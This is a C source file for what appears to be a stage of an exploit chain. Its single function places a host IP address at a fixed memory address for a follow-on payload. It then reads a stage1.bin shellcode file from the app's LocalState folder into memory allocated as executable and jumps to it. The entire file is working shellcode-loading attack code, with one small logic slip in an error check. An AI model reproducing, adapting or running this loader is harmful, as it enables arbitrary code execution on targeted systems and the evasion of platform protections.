#include "pch.h"

#define MAX_SHELLCODE_SZ (4 * 1024 * 1024) // 4MB
#define HOST_IP "192.168.42.1"

typedef struct _SHELLCODE_ARGS {
	const char* image_name;
	const char* image_args;
} SHELLCODE_ARGS, *PSHELLCODE_ARGS;

typedef uint64_t (*SHELLCODE_FN)();

// Fixed offset where solstice payload will read from
VOID* STATIC_HANDOFF_PTR = (VOID*)0x44000000;

typedef struct _COLLAT_INFO {
	BYTE ip_addr[0x10];
} COLLAT_INFO, * PCOLLAT_INFO;

void test() {
	DWORD dwResult = 0;
	// Copy Host IP address to static offset for stage1 to read form
	BYTE* infoBuf = (BYTE*)VirtualAllocEx(INVALID_HANDLE_VALUE, STATIC_HANDOFF_PTR, 0x10, MEM_RESERVE | MEM_COMMIT, 0x40);
	if (infoBuf == NULL) {
		dwResult = GetLastError();
		return;
	}
	else if (infoBuf != STATIC_HANDOFF_PTR) {
		VirtualFree(infoBuf, 0, MEM_RELEASE);
		return;
	}

	memset(STATIC_HANDOFF_PTR, 0x00, 0x10);
	memcpy(STATIC_HANDOFF_PTR, HOST_IP, strlen(HOST_IP));

	// Shellcode handling

	// Extend the path to a full path to stage1 payload
	DWORD fullPathLen = 0;
	WCHAR *extendedPath = (WCHAR*)VirtualAllocEx(INVALID_HANDLE_VALUE, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, 0x40);
	if (extendedPath == NULL) {
		dwResult = GetLastError();
		return;
	}
	dwResult = ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\..\\LocalState\\stage1.bin", extendedPath, MAX_PATH);
	if (dwResult == 0) {
		dwResult = GetLastError();
		return;
	}

	fullPathLen = GetFullPathNameW(extendedPath, 0, NULL, NULL);
	if (dwResult == 0) {
		dwResult = GetLastError();
		return;
	}

	WCHAR* filePart = NULL;
	WCHAR *stage1FullPath = (WCHAR*)VirtualAllocEx(INVALID_HANDLE_VALUE, NULL, fullPathLen, MEM_RESERVE | MEM_COMMIT, 0x40);
	// Get the full path name
	dwResult = GetFullPathNameW(extendedPath, fullPathLen, stage1FullPath, &filePart);
	VirtualFree(extendedPath, 0, MEM_RELEASE);
	if (dwResult == 0) {
		dwResult = GetLastError();
		return;
	}

	DWORD oldProtect = 0;

	// Allocate as read/write
	BYTE* scBuf = (BYTE *)VirtualAllocEx(INVALID_HANDLE_VALUE, NULL, MAX_SHELLCODE_SZ, MEM_RESERVE | MEM_COMMIT, 0x40);
	if (scBuf == NULL) {
		dwResult = GetLastError();
		return;
	}

	// Open binary file with shellcode
	HANDLE hShellcode = CreateFile2(stage1FullPath, GENERIC_READ, 0, OPEN_EXISTING, NULL);
	VirtualFree(stage1FullPath, 0, MEM_RELEASE);
	if (hShellcode == INVALID_HANDLE_VALUE) {
		dwResult = GetLastError();
		return;
	}

	// Read shellcode into preallocated buffer
	DWORD numBytesRead = 0;
	BOOL bRet = ReadFile(hShellcode, scBuf, MAX_SHELLCODE_SZ, &numBytesRead, NULL);
	if (!bRet) {
		dwResult = GetLastError();
		return;
	}

	if (numBytesRead == 0 || numBytesRead >= MAX_SHELLCODE_SZ) {
		CloseHandle(hShellcode);
		return;
	}

	CloseHandle(hShellcode);

	// Change protection to PAGE_EXECUTE
	bRet = VirtualProtectEx(INVALID_HANDLE_VALUE, scBuf, MAX_SHELLCODE_SZ, 0x10, &oldProtect);
	if (!bRet) {
		dwResult = GetLastError();
		return;
	}

	SHELLCODE_FN fn = (SHELLCODE_FN)scBuf;

	// Execute shellcode
	fn();
}